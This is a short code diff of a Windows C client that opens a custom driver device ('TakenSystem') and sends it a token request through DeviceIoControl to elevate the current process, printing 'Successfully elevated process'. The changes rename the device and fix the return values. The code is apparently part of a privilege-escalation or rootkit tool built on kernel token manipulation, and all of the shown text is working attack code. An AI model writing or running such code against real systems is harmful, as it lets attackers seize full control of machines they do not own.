@@ -62,7 +62,7 @@ int wmain(int argc, wchar_t* argv[]) {
 	printf("[+] Current process PID: %lu\n", Pid);
 
 	HANDLE hDevice = CreateFile(
-		L"\\\\.\\TakenDown",
+		L"\\\\.\\TakenSystem",
 		GENERIC_READ | GENERIC_WRITE,
 		0,
 		NULL,
@@ -73,7 +73,7 @@ int wmain(int argc, wchar_t* argv[]) {
 
 	if (hDevice == INVALID_HANDLE_VALUE) {
 		wprintf(L"[-] Failed to open device\n");
-		return;
+		return -1;
 	}
 
 	Token TokenInfo;
@@ -94,7 +94,7 @@ int wmain(int argc, wchar_t* argv[]) {
 	if (!success) {
 		wprintf(L"[-] DeviceIoControl failed\n");
 		CloseHandle(hDevice);
-		return;
+		return -1;
 	}
 
 	wprintf(L"[+] Successfully elevated process: %lu\n", Pid);
